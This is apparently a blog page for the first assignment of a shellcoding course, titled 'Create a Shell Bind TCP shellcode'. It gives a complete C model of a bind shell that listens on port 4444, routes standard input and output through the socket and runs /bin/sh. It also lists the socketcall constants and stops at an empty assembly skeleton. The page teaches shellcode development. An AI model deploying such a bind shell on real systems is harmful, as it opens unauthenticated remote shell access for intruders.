---
title:  Assignment 1
description: Create a Shell Bind TCP shellcode
order: 1
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

Before we dive into shellcode, we'll first write a simple program in c to model the functionality.

```c
/* bind_tcp_model.c
 *  - Bind to a socket, listen for a connection, provide shell.
 */

#include <sys/socket.h>	// socket, AF_INET, SOCK_STREAM
#include <unistd.h>	// dup2
#include <netinet/in.h>	// sockaddr, htons, INADDR_ANY

int main() {
	int port = 4444;
	int sockfd, connfd;
	struct sockaddr_in sockaddr;

	// Build socket

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// Bind to socket

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = INADDR_ANY;

	bind(sockfd, (struct sockaddr *) &sockaddr, sizeof(sockaddr));

	// Listen on socket

	listen(sockfd, 0);

	// Accept a connection

	connfd = accept(sockfd, 0, 0);

	// Route i/o through connection

	dup2(connfd, 0);
	dup2(connfd, 1);
	dup2(connfd, 2);

	// Execute /bin/sh

	execve("/bin/sh", 0, 0);

	return 0;
}

```

Since the first step is creating a socket, let's look at the syscall *socketcall*.
```c
int socketcall(int call, unsigned long *args);
```
The syscall *socketcall* seems to accept a *call* parameter, so we'll take a look at those too.
```bash
> grep SYS_ /usr/include/linux/net.h

#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
#define SYS_GETSOCKNAME	6		/* sys_getsockname(2)		*/
#define SYS_GETPEERNAME	7		/* sys_getpeername(2)		*/
#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/
#define SYS_SEND	9		/* sys_send(2)			*/
#define SYS_RECV	10		/* sys_recv(2)			*/
#define SYS_SENDTO	11		/* sys_sendto(2)		*/
#define SYS_RECVFROM	12		/* sys_recvfrom(2)		*/
#define SYS_SHUTDOWN	13		/* sys_shutdown(2)		*/
#define SYS_SETSOCKOPT	14		/* sys_setsockopt(2)		*/
#define SYS_GETSOCKOPT	15		/* sys_getsockopt(2)		*/
#define SYS_SENDMSG	16		/* sys_sendmsg(2)		*/
#define SYS_RECVMSG	17		/* sys_recvmsg(2)		*/
#define SYS_ACCEPT4	18		/* sys_accept4(2)		*/
#define SYS_RECVMMSG	19		/* sys_recvmmsg(2)		*/
#define SYS_SENDMMSG	20		/* sys_sendmmsg(2)		*/
```
To create a socket we'll need SYS_SOCKET, 1.  Now we can start some assembly.

```nasm
; bind_shell_tcp.nasm
; - Bind to a socket, listen for a connection, provide shell.

global _start

section .data
_start:


```

<br>
{% include preamble.md %}


[&lt;&lt; Go Back]({{ site.baseurl }})
